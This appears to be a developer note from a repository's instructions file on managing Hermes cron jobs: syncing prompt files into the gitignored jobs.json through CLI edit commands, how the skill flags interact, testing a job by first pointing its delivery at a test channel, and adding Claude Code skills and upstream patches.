Run `make status` after any skill rename.

**Three layers have to move together, and only two are in git.** `cron/*.prompt.txt` and
`cron/*.md` are tracked; **`cron/jobs.json` is gitignored runtime state**, and the live job
carries its **own copy of the prompt** — editing the `.txt` alone changes nothing at runtime.
Push changes through the CLI, never by hand-editing `jobs.json` under a running gateway:

```bash
hermes cron edit <job_id> --prompt "$(cat cron/morning-briefing.prompt.txt)"
hermes cron edit <job_id> --skill argo-api --skill work    # replaces the set
```

`--clear-skills` is applied *after* `--skill` in the same invocation and wins, leaving
`Skills: none` — pass `--skill` alone to replace a set. Verify with `hermes cron list`, and
test a changed job with `hermes cron run <job_id>`; it has **no dry-run and delivers for
real**, so retarget it first (`--deliver slack:<test-channel>`) and restore the target after.

**Adding a CC slash command for Hermes:** create `.claude/skills/{name}/SKILL.md`. Auto-loaded by Claude Code when started inside this repo — no symlink, no Makefile change needed.

**Patches:** when fixing bugs in upstream Hermes, save the diff under `patches/`
and document the re-apply command in this file.
